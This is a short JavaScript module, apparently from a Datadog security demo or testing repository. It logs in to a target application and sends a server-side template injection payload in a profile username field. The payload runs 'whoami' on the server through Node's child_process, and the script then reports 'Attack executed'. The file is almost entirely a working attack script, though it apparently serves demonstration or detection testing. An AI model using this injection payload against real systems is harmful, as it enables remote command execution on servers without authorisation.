// Unless explicitly stated otherwise all files in this repository are licensed under the Apache 2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/) Copyright 2026 Datadog, Inc.

const  ora = require('ora');
const logSymbols= require('log-symbols');
const { http } = require('../lib/request');
const ssrf = require('./ssrf');

const threshold = 100;

async function ssti(targetURL){

    let info = await ssrf.createAndLogin(targetURL)

    const spinner = ora('Executing SSTI').start();

    await http(info.token).post(targetURL + '/profile',{
        username: "#{require('child_process').execSync('whoami')}"
    })
    spinner.stopAndPersist({
                    symbol: logSymbols.success,
                    text: 'Attack executed',
                });
}

module.exports = { ssti }